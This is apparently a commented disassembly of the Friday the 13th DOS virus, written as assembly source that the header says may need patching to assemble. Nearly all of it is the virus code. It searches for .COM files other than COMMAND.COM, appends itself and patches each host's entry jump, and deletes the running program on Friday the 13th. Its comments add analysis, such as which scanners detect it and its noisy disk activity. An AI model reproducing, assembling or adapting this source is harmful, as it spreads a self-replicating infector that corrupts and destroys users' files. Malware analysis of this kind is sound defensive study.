PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                                                      ;;
;;;                             FRIDAY13                                 ;;
;;;                                                                      ;;
;;;      Created:   31-Jul-90                                            ;;
;;;      Version:                                                        ;;
;;;      Passes:    9          Analysis Options on: QRS                  ;;
;;;                                                                      ;;
;;;                                                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;       This assembly code was created from the Sourcer disassembly of
;       the original virus.

;       The Assembler option was set to "Other" and may require some
;       patching in order to assemble properly with any given
;       compiler.


;       Primitive virus, infects every .COM file not exceeding 64k
;       that if finds, with the exception of COMMAND.COM.....the
;       extended disk activity is easily spotted and should warn
;       any reasonably alert user that something is amiss.

;       Infected files can be detected with John McAfee's virus
;       scanners and Fridrik Skulason's F-PROT package, to name my
;       favorite tools.

;       The F-PROT package will remove the virus from infected files
;       without damaging the host programs, in my experience, while
;       CleanUp destroys both the virus and the host program.

movSeg           macro reg16, unused, Imm16     ; Fixup for Assembler
                 ifidn  , 
                 db     0BBh
                 endif
                 ifidn  , 
                 db     0B9h
                 endif
                 ifidn  , 
                 db     0BAh
                 endif
                 ifidn  , 
                 db     0BEh
                 endif
                 ifidn  , 
                 db     0BFh
                 endif
                 ifidn  , 
                 db     0BDh
                 endif
                 ifidn  , 
                 db     0BCh
                 endif
                 ifidn  , 
                 db     0BBH
                 endif
                 ifidn  , 
                 db     0B9H
                 endif
                 ifidn  , 
                 db     0BAH
                 endif
                 ifidn  , 
                 db     0BEH
                 endif
                 ifidn  , 
                 db     0BFH
                 endif
                 ifidn  , 
                 db     0BDH
                 endif
                 ifidn  , 
                 db     0BCH
                 endif
                 dw     seg Imm16
endm

;       Start of the actual Friday 13th code

data_1e         equ     2Ch                     ; (77B9:002C=0)

data_2e         equ     80h                     ; (77B9:0080=0)
                                                ; DTA

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

friday13        proc    far

start:
                jmp     loc_1                   ; (014F)
                                                ; begin preparations

data_5          dw      0                       ;  xref 77B9:01D8, 01E5, 01EF, 0250
                                                ;            0289
                                                ; first 3 bytes of host

data_7          dw      4900h                   ;  xref 77B9:01DC, 024C, 0290
                db       4Eh, 46h, 45h, 43h, 54h, 45h
                db       44h, 00h               ; INFECTED
                                                ; An escaped lab version???

data_8          db      0E9h                    ;  xref 77B9:01EC, 0229
                                                ; replacement first 3 bytes
                                                ; of host prog.

data_9          dw      0                       ;  xref 77B9:0216, 0235
                                                ; start of virus code

data_10         db      2Ah                     ;  xref 77B9:0193
                db       2Eh, 43h, 4Fh, 4Dh
                db      0                       ; *.COM

data_12         db      0                       ;  xref 77B9:018A
                db      25 dup (0)              ;

data_13         dw      0                       ;  xref 77B9:01F5
                db      0, 0                    ; size of host file

data_14         db      0                       ;  xref 77B9:01B7, 01CC
                db      12 dup (0)              ; host file name

data_15         db      'COMMAND.COM', 0        ;  xref 77B9:01BA

;       Saves necessary host program data to enable return of control
;       to the host program when the virus has done its work.

loc_1:                                          ;  xref 77B9:0100
                push    cs                      ; save host seg.
                push    ax                      ; and offset space
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                mov     bp,sp                   ; host offset in stack
                mov     word ptr [bp+10h],100h
                call    sub_1                   ; (0163)

friday13                endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;
;         Called from:   77B9:0160
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;       Take control from host program.

sub_1           proc    near
                pop     ax
                sub     ax,63h
                mov     cl,4                    ; assume control
                shr     ax,cl                   ; Shift w/zeros fill
                mov     bx,cs
                add     ax,bx
                sub     ax,10h
                push    ax                      ; CS modified
                mov     ax,178h
                push    ax
                retf
sub_1           endp

                mov     ax,cs
                mov     ds,ax
                call    sub_2                   ; (0185)
                                                ; replication routine
                call    sub_4                   ; (025B)
                                                ; self-destruction routine
                jmp     loc_11                  ; (0289)
                                                ; return control to host

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;
;         Called from:   77B9:017C
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;       Self-replication routine

sub_2           proc    near                    ; self-replication begins
                push    es
                push    ds
                pop     es
                mov     ah,1Ah                  ; DTA
                mov     dx,offset data_12       ; (77B9:0118=0)
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                mov     ah,4Eh                  ; 'N'
                xor     cx,cx                   ; Zero register
                mov     dx,offset data_10       ; (77B9:0112=2Ah)
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                jc      loc_3                   ; Jump if carry Set

loc_2:                                          ;  xref 77B9:01A1
                call    sub_3                   ; (01B2)
                mov     ah,4Fh                  ; 'O'
                int     21h                     ; DOS Services  ah=function 4Fh
                                                ;  find next filename match

                jnc     loc_2                   ; Jump if carry=0
                                                ; find all potential host
                                                ; files, quit when no more
                                                ; to infect
                                                ; This is the basic weakness
                                                ; of the virus.

loc_3:                                          ;  xref 77B9:0198
                pop     ax
                push    ax
                push    ds
                mov     ds,ax
                mov     ah,1Ah                  ; restore DTA
                mov     dx,data_2e              ; (77B9:0080=0)
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                pop     ds
                pop     es
                retn
sub_2           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;
;         Called from:   77B9:019A
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;       Suitable host file found, so infect it.

sub_3           proc    near
                push    es
                mov     ax,ds
                mov     es,ax
                mov     si,offset data_14       ; (77B9:0136=0)
                                                ; Host file name

                mov     di,offset data_15       ; (77B9:0143=43h)
                                                ; COMMAND.COM
                mov     cx,0Ch
                cld                             ; Clear direction
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                                                ; Is the file COMMAND.COM??
                pop     es
                jnz     loc_4                   ; Jump if not zero
                                                ; Not COMMAND.COM, so infect it

                jmp     loc_ret_9               ; (025A)
                                                ; Yes, so leave.

;       Open file to read/write

loc_4:                                          ;  xref 77B9:01C4
                mov     ax,3D02h
                mov     dx,offset data_14       ; (77B9:0136=0)
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jnc     loc_5                   ; Jump if carry=0
                jmp     loc_8                   ; (0258)

;       Save first 3 bytes of host program

loc_5:                                          ;  xref 77B9:01D1
                mov     bx,ax
                push    data_5                  ; (77B9:0103=0)
                push    data_7                  ; (77B9:0105=4900h)
                mov     ah,3Fh                  ; '?'
                mov     cx,3
                mov     dx,offset data_5        ; (77B9:0103=0)
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      loc_7                   ; Jump if carry Set
                mov     al,data_8               ; (77B9:010F=0E9h)
                                                ; Check host for infection
                cmp     byte ptr data_5,al      ; (77B9:0103=0)
                jne     loc_6                   ; Jump if not equal
                mov     ax,data_13              ; (77B9:0132=0)
                sub     ax,1A0h
                sub     ax,3
                cmp     word ptr data_5+1,ax    ; (77B9:0104=0)
                je      loc_7                   ; Jump if equal

loc_6:                                          ;  xref 77B9:01F3
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_7                   ; Jump if carry Set
                or      ax,0Fh
                inc     ax
                sub     ax,3
                mov     data_9,ax               ; (77B9:0110=0)
                                                ; virus code begins here
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_7                   ; Jump if carry Set
                mov     ah,40h                  ; '@'
                mov     cx,3
                mov     dx,offset data_8        ; (77B9:010F=0E9h)
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      loc_7                   ; Jump if carry Set
                mov     ax,4201h                ; point to end
                xor     cx,cx                   ; Zero register
                mov     dx,data_9               ; (77B9:0110=0)
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_7                   ; Jump if carry Set
                mov     ah,40h                  ; '@'
                                                ; append viral code to end
                                                ; of host file
                mov     cx,1A0h                 ; number of bytes to write
                mov     dx,offset ds:[100h]     ; (77B9:0100=0E9h)
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      loc_7                   ; Jump if carry Set
                jmp     loc_7                   ; (024C)

;       Restore first three bytes of host program and close the file

loc_7:                                          ;  xref 77B9:01EA, 0202, 020D, 0222
                                                ;            022E, 023B, 0247, 0249
                pop     data_7                  ; (77B9:0105=4900h)
                pop     data_5                  ; (77B9:0103=0)
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle

;       Finished?

loc_8:                                          ;  xref 77B9:01D3
                jnc     loc_ret_9               ; Jump if carry=0

;       Yes, then return.

loc_ret_9:                                      ;  xref 77B9:01C6, 0258
                retn
sub_3           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;
;         Called from:   77B9:017F
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;       Here is where it gets nasty.  This subroutine checks the date when
;       the host program is called and, if it's a Friday the 13th, the
;       file is deleted.

sub_4           proc    near
                push    es
                mov     ah,2Ah                  ; '*'
                int     21h                     ; DOS Services  ah=function 2Ah
                                                ;  get date, cx=year, dx=mon/day
                cmp     dl,0Dh                  ; is today the day?
                jne     loc_10                  ; Jump if not equal
                cmp     al,5
                jne     loc_10                  ; Jump if not equal
                xor     ax,ax                   ; Zero register
                mov     cx,7FFFh
                xor     di,di                   ; Zero register
                mov     es,es:data_1e           ; (77B9:002C=0)
                                                ; environment block seg. address
                cld                             ; Clear direction
                repne   scasw                   ; Rep zf=0+cx >0 Scan es:[di] for ax
                jnz     loc_10                  ; Jump if not zero
                add     di,2
                push    ds                      ; start self-destruct
                push    es
                pop     ds
                mov     ah,41h                  ; 'A'
                mov     dx,di
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx
                pop     ds
loc_10:                                         ;  xref 77B9:0263, 0267, 0278
                pop     es
                retn
sub_4           endp


;       Return control to host program.

loc_11:                                         ;  xref 77B9:0182
                mov     ax,data_5               ; (77B9:0103=0)
                mov     word ptr es:[100h],ax   ; (77B9:0100=4CE9h)
                mov     al,byte ptr data_7      ; (77B9:0105=0)
                mov     byte ptr es:[102h],al   ; (77B9:0102=0)
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                retf                            ; Return far

seg_a           ends



                end     start

;;;;;;;;;;;;;;;;;;;; CROSS REFERENCE - KEY ENTRY POINTS ;;;;;;;;;;;;;;;;;;;

    seg:off    type        label
   ---- ----   ----   ---------------
   77B9:0100   far    start

 ;;;;;;;;;;;;;;;;;; Interrupt Usage Synopsis ;;;;;;;;;;;;;;;;;;

        Interrupt 21h :  set DTA to ds:dx
        Interrupt 21h :  get date, cx=year, dx=mon/day
        Interrupt 21h :  open file, al=mode,name@ds:dx
        Interrupt 21h :  close file, bx=file handle
        Interrupt 21h :  read file, cx=bytes, to ds:dx
        Interrupt 21h :  write file cx=bytes, to ds:dx
        Interrupt 21h :  delete file, name @ ds:dx
        Interrupt 21h :  move file ptr, cx,dx=offset
        Interrupt 21h :  find 1st filenam match @ds:dx
        Interrupt 21h :  find next filename match

 ;;;;;;;;;;;;;;;;;; I/O Port Usage Synopsis  ;;;;;;;;;;;;;;;;;;

        No I/O ports used.
